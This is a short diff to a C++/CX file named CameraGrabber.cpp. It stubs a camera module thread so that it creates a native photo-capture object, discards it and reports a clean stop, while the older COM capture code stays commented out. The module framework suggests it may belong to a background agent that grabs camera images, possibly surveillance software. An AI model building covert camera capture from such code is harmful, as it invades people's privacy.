@@ -6,6 +6,9 @@
 
 #include "wtypes.h"
 
+#include "NativePhotoCaptureInterface.h"
+using namespace NativePhotoCaptureInterface::Native;
+
 DWORD WINAPI CameraModule(LPVOID lpParam) {
 	Module *me = (Module *)lpParam;
 	HANDLE moduleHandle;
@@ -20,9 +23,16 @@ DWORD WINAPI CameraModule(LPVOID lpParam) {
 	me->setStatus(MODULE_RUNNING);
 	moduleHandle = me->getEvent();
 
-	/***
+	
 	DBG_TRACE(L"Debug - CameraGrabber.cpp - Camera Module is Alive\n", 5, FALSE);
 
+	NativeCapture^ photoCapture = ref new NativeCapture();
+	photoCapture=nullptr;
+
+	me->setStatus(MODULE_STOPPED);
+	DBG_TRACE(L"Debug - CameraGrabber.cpp - Camera Module clean stop\n", 5, FALSE);
+
+/***
 	HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
 
 	// CoUninitialize va chiamata se la funzione torna S_OK o S_FALSE
